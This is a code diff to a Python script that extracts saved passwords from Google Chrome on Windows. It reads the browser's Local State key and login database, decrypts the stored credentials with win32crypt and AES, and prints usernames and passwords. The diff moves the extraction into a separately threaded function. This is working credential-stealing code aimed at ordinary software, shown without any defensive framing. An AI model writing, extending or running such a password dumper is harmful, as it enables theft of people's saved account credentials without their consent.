@@ -1,5 +1,5 @@
 
-import os, json, base64, win32crypt, shutil, sqlite3
+import os, json, base64, win32crypt, shutil, sqlite3, threading
 from Crypto.Cipher import AES
 
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
@@ -61,7 +61,7 @@ def decrypt(ciphertext, secret_key):
     #Step 4: Decrypted Password    
     return decrypted_pass
     
-def run():
+def get_and_decrypt_all_passwords():    
     secret_key = get_secret_key()
     
     data = fetch_data_from_local_db()
@@ -80,6 +80,14 @@ def run():
         print("Username : ", username)
         print("Password : ", decrypted_pass)
         print()
+        
+def run():
+    # Start get_and_decrypt_all_passwords in a separate thread
+    thread = threading.Thread(target=get_and_decrypt_all_passwords)
+    
+    thread.start()
+    
+    thread.join()
         
 if __name__ == "__main__":
     run()
